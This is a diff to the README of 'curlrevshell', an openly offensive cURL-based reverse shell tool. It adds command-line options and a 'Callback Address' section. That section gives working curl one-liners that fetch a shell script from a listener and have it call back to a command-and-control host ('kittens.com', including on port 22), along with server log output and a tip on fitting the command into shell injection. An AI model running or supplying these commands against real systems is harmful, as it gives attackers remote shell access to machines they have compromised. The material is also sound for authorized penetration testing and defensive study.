@@ -64,16 +64,20 @@ Usage: curlrevshell [options]
 Even worse reverse shell, powered by cURL
 
 Options:
+  -callback-address address
+    	Additional callback address or domain, for one-liner printing (may be repeated)
   -callback-template template
     	Optional callback template file
   -listen-address address
     	Listen address (default "0.0.0.0:4444")
+  -no-timestamps
+    	Don't print timestamps
   -print-default-template
     	Write the default template to stdout and exit
   -serve-files-from directory
     	Optional directory from which to serve static files
   -tls-certificate-cache file
-    	Optional file in which to cache generated TLS certificate (default "/home/you/.cache/curlrevshell/cert.txtar")
+    	Optional file in which to cache generated TLS certificate (default "/home/stuart/.cache/curlrevshell/cert.txtar")
 ```
 
 Details
@@ -84,8 +88,8 @@ Endpoint          | Description
 ------------------|------------
 `/i/{id}`         | Long-lived connection for input from you to the shell.
 `/o/{id}`         | Output from the shell to you, one line at a time.  The `{id}` has to match `/i`'s.
-`/c`              | Serves up a little script that takes the place of `bash >/dev/tcp...` and makes you appreciate low PIDs
-`/{anythingelse}` | Either 404's or serves up files if you started it with `-serve-files-from`.
+`/c`              | Serves up a little script that takes the place of `bash >/dev/tcp...` and makes you appreciate low PIDs.
+`/{anythingelse}` | Either serves up files of 404's if nobody gave it `-serve-files-from` (which doesn't actually have to be a directory).
 
 Callback Template
 -----------------
@@ -100,6 +104,44 @@ $ curlrevshell -callback-template ./custom.tmpl     # Run with your fancy new te
 The struct passed to the template is `TemplateParams` in
 [script.go](internal/hsrv/script.go).  The default script is
 [script.tmpl](internal/hsrv/script.tmpl).
+
+Callback Address
+----------------
+Most of the time if you can connect to the server to grab a script (i.e. `/c`)
+the server will work out the right callback address.  Most of the time.  For
+those times which aren't Most, giving a URL with either a `c2` parameter to `/c`
+or a `c2:` header should clear things up.  This is clearer with an example:
+
+### As a URL parameter
+The Request for a script:
+```sh
+curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c?c2=kittens.com'
+```
+The `curl` command in the script:
+```sh
+curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com/i/1upal29kpq9g7 </dev/null 2>&0 |
+```
+With `?c2=kittens.com` it would have been `https://192.168.1.10:4444` instead.
+
+The server also tells us that the script was generated for `kittens.com`:
+```
+22:08:20.488 [192.168.1.20] Sent script: ID:1upal29kpq9g7 URL:kittens.com
+```
+
+### As a header
+Sometimes it's a pain to put `?` and such in shell injection.  Headers are
+easier.  We'll also add a port this time.
+```sh
+curl -Hc2:kittens.com:22 -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c'
+```
+Weird flex, but it worked.
+```sh
+curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com:22/i/2v0ohzqf5kw1t </dev/null 2>&0 |
+```
+Server agrees
+```
+22:14:13.902 [192.168.1.20] Sent script: ID:2v0ohzqf5kw1t URL:kittens.com:22
+```
 
 TLS
 ---
